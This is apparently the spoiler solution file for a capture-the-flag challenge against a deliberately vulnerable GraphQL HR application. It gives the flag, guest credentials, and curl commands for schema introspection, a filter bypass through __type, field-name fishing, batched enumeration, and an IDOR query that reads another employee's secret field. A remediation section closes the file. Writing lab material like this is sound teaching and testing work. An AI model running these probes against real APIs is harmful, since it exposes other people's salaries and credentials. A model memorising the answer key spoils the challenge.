# SOLUTION — NIMBUS People Cloud  🚩 SPOILERS

> Keep this file away from players. It contains the full intended solve and the flag.

**Flag:** `Securinets{br0k3n_0bj3ct_l3v3l_auth_v1a_gr4phql_1ntr0sp3ct10n}`

**Bug class:** Broken Object-Level Authorization (BOLA / IDOR) in GraphQL
resolvers, discovered via introspection. Resolvers authenticate the caller but
never check that the requested object belongs to them.

---

## Overview of the chain

1. **Authenticate** as the low-privilege guest employee (id `17`). The UI only
   ever renders your own data.
2. **Introspect** the schema to find API surface the UI never uses. In the
   default mode, introspection is fully open, so any GraphQL client maps the
   schema and reveals:
   - a `Query.employee(id: ID!)` field,
   - a `Query.payslipsFor(employeeId: ID!)` field,
   - sensitive `Employee` fields the UI never selects: `salary`,
     `passwordHash`, `confidentialMemo`, and `vaultSecret`.
3. **IDOR across the ID boundary.** Employee IDs are small integers. As the
   guest, call `employee(id: 1)` (the CEO) and select `vaultSecret`. The
   resolver only checks that you're logged in, not that record `1` is yours.
4. **Read the flag** from the CEO's `vaultSecret`.

Players reach this with any GraphQL client (Burp, Postman, Altair, GraphiQL,
curl, …) pointed at `/graphql`. The curl walkthrough below is one way.

Set once at the top for all the curl commands below:

```bash
BASE=http://localhost:8080
```

---

## Step 1 — Authenticate as the guest

```bash
TOKEN=$(curl -s $BASE/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation($e:String!,$p:String!){ login(email:$e,password:$p){ token employee { id firstName role } } }","variables":{"e":"guest.employee@nimbus.example","p":"N1mbus@Guest2026"}}')

echo "$TOKEN"
# -> employee { id: "17", firstName: "Guest", role: "EMPLOYEE" }

# extract the JWT into $JWT for later calls:
JWT=$(printf '%s' "$TOKEN" | sed -E 's/.*"token":"([^"]+)".*/\1/')
```

Confirm the UI's own view is correctly scoped — `me` only ever returns you:

```bash
curl -s $BASE/graphql -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  -d '{"query":"{ me { id firstName lastName title } }"}'
# -> { "data": { "me": { "id":"17","firstName":"Guest","lastName":"Employee", ... } } }
```

---

## Step 2 — Introspection (default mode)

Introspection is fully open. One standard query dumps the whole schema; here we
just list the root query fields and the `Employee` fields:

```bash
curl -s $BASE/graphql -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { fields { name } } } }"}'
# -> me, myPayslips, myLeaveRequests, myManagerChain, employee, payslipsFor, departments

curl -s $BASE/graphql -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  -d '{"query":"{ __type(name:\"Employee\"){ fields { name description } } }"}'
# -> includes: salary, passwordHash, confidentialMemo, vaultSecret
```

### Hard-mode variant (`ENABLE_WAF=1`)

If the operator enabled the naive gateway filter, full-schema introspection is
blocked:

```bash
curl -s $BASE/graphql -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name } } }"}'
# -> errors: "Request blocked by NIMBUS API gateway policy ..."  (code POLICY_BLOCKED)
```

**But `__type` is not filtered** — walk the schema field-by-field to bypass it:

```bash
curl -s $BASE/graphql -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  -d '{"query":"{ __type(name:\"Query\"){ fields { name args { name } } } }"}'
# -> employee(id), payslipsFor(employeeId), ...

curl -s $BASE/graphql -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  -d '{"query":"{ __type(name:\"Employee\"){ fields { name description } } }"}'
# -> salary, passwordHash, confidentialMemo, vaultSecret
```

> **Flavor / alternative probes**
>
> - **Field suggestions ("did you mean") are enabled**, so even without
>   `__type` you can fish for field names:
>   ```bash
>   curl -s $BASE/graphql -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
>     -d '{"query":"{ me { vaultSekret } }"}'
>   # -> 'Cannot query field "vaultSekret" on type "Employee". Did you mean "vaultSecret"?'
>   ```
> - **Batching is accepted**, so enumeration can't be rate-limited per request —
>   one POST can carry an array of operations:
>   ```bash
>   curl -s $BASE/graphql -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
>     -d '[{"query":"{ employee(id:1){ lastName } }"},{"query":"{ employee(id:2){ lastName } }"},{"query":"{ employee(id:3){ lastName } }"}]'
>   # -> an array of results, one per operation
>   ```

---

## Step 3 + 4 — IDOR across the boundary → the flag

As the guest, read the CEO (id `1`) and select the executive-only field:

```bash
curl -s $BASE/graphql -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  -d '{"query":"{ employee(id:1){ id firstName lastName title role vaultSecret } }"}'
```

Response:

```json
{
  "data": {
    "employee": {
      "id": "1",
      "firstName": "Margaret",
      "lastName": "Okafor",
      "title": "Chief Executive Officer",
      "role": "EXECUTIVE",
      "vaultSecret": "Securinets{br0k3n_0bj3ct_l3v3l_auth_v1a_gr4phql_1ntr0sp3ct10n}"
    }
  }
}
```

🚩 **`Securinets{br0k3n_0bj3ct_l3v3l_auth_v1a_gr4phql_1ntr0sp3ct10n}`**

### One-liner (login → IDOR → flag)

```bash
BASE=http://localhost:8080
JWT=$(curl -s $BASE/graphql -H 'Content-Type: application/json' \
  -d '{"query":"mutation{login(email:\"guest.employee@nimbus.example\",password:\"N1mbus@Guest2026\"){token}}"}' \
  | sed -E 's/.*"token":"([^"]+)".*/\1/')
curl -s $BASE/graphql -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' \
  -d '{"query":"{ employee(id:1){ vaultSecret } }"}'
```

---

## Decoys (red herrings)

To make the flag format the disambiguator, several records expose *secret-looking*
data that is **not** the flag:

- Every employee's `passwordHash` is a real bcrypt hash (crackable to
  `Welcome123!`, but worthless — it's not the flag).
- The CISO (id `2`) has a `vaultSecret` of
  `ops-note: rotate staging AWS access keys before 2026-12-31` — looks juicy,
  not a flag.
- Several `confidentialMemo` fields contain HR gossip (PIPs, counter-offers).
  Flavorful, not the flag.

Only the CEO's `vaultSecret` matches `Securinets{...}`.

---

## The real fix (post-event debrief)

The challenge bundles one authorization bug with several misconfigurations.
All of them are intentional; here is how each should be remediated in a real
system:

1. **Enforce object-level authorization in every resolver** (the actual fix).
   Authenticating the caller is not enough — each resolver that takes an object
   id must verify the caller is *allowed to see that object*. For
   `employee(id)` / `payslipsFor(employeeId)`: either reject when
   `id !== session.employeeId`, or allow only for roles with a legitimate need
   (e.g. a manager over that employee, or HR) and scope the query accordingly.
   Prefer a central policy/authorization layer over ad-hoc checks.

2. **Apply field-level authorization to sensitive fields.** `salary`,
   `passwordHash`, `confidentialMemo` and `vaultSecret` should be gated by
   policy (and `passwordHash` should never be exposed in the schema at all).

3. **Disable introspection and field suggestions in production.** Set
   `introspection: false`; for graphql-js, strip "did you mean" suggestions
   (e.g. a validation rule / `didYouMean`-less error formatting) so the schema
   can't be walked from error messages. Don't rely on a string-matching gateway
   filter — blocking `__schema` while leaving `__type` reachable is security
   theater.

4. **Don't treat batching as a rate-limit boundary.** Enforce cost/complexity
   limits and depth limits, and account for batched operations in any
   throttling.

5. **Use enumerated/opaque identifiers** (UUIDs) instead of sequential integer
   ids so object references aren't trivially guessable — defense in depth, not
   a substitute for (1).

6. **Keep least privilege at the data layer** (already done here): the app's DB
   role is read-mostly, so even chained bugs can't escalate to data
   destruction.
